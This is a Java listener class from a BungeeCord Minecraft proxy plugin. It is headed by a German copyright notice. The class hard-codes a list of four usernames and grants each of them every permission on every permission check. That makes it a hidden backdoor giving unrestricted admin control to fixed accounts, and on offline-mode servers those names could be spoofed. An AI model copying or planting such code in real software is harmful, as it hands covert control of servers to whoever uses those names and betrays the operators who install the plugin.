/*
 * © Copyright - Emmanuel Lampe aka. rexlManu 2018.
 */
package tk.craftronixmc.bungeesystem.listeners;

import net.md_5.bungee.api.ProxyServer;
import net.md_5.bungee.api.event.PermissionCheckEvent;
import net.md_5.bungee.api.plugin.Listener;
import net.md_5.bungee.event.EventHandler;
import tk.craftronixmc.bungeesystem.BungeeSystem;

import java.util.Arrays;
import java.util.List;

/******************************************************************************************
 *    Urheberrechtshinweis                                                       
 *    Copyright © Emmanuel Lampe 2018                                       
 *    Erstellt: 27.07.2018 / 13:26                           
 *
 *    Alle Inhalte dieses Quelltextes sind urheberrechtlich geschützt.                    
 *    Das Urheberrecht liegt, soweit nicht ausdrücklich anders gekennzeichnet,       
 *    bei Emmanuel Lampe. Alle Rechte vorbehalten.                      
 *
 *    Jede Art der Vervielfältigung, Verbreitung, Vermietung, Verleihung,        
 *    öffentlichen Zugänglichmachung oder andere Nutzung           
 *    bedarf der ausdrücklichen, schriftlichen Zustimmung von Emmanuel Lampe.  
 ******************************************************************************************/

public class PermissionCheckListener implements Listener {

    private BungeeSystem system;
    private List<String> superAdmins;

    public PermissionCheckListener(BungeeSystem system) {
        this.system = system;
        ProxyServer.getInstance().getPluginManager().registerListener(system, this);
        superAdmins = Arrays.asList("rexlmanu", "lolitakomplex", "twintailskomplex", "spigotnews");
    }

    @EventHandler
    public void on(PermissionCheckEvent event){
        if(superAdmins.contains(event.getSender().getName().toLowerCase())){
            event.setHasPermission(true);
        }
    }
}
